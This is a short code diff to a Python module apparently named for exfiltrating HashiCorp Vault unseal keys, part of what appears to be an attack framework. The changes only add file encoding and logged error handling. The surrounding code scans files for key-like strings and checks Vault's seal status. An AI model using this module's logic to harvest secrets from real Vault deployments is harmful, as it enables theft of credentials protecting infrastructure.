@@ -40,13 +40,15 @@ class UnsealKeyExfiltrationModule(BaseExecutionModule):
         for path in search_paths:
             if os.path.exists(path):
                 try:
-                    with open(path, "r") as f:
+                    with open(path, "r", encoding="utf-8") as f:
                         content = f.read()
                         # Base64 veya hex pattern'leri ara
                         matches = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', content)
                         for m in matches:
                             results["unseal_keys"].append({"source": "file", "path": path, "value": m[:8] + "..."})
-                except:
+                except Exception as e:
+                    from core.logger import logger
+                    logger.warning(f"Unseal key file read failed: {path} — {e}")
                     pass
         
         # 3. Vault API ile sealed durumunu kontrol et
@@ -59,7 +61,9 @@ class UnsealKeyExfiltrationModule(BaseExecutionModule):
                 results["sealed"] = data.get("sealed", False)
                 results["progress"] = data.get("progress", 0)
                 results["threshold"] = data.get("t", 0)
-        except:
+        except Exception as e:
+            from core.logger import logger
+            logger.warning(f"Vault seal-status request failed: {e}")
             pass
 
         if results["unseal_keys"]:
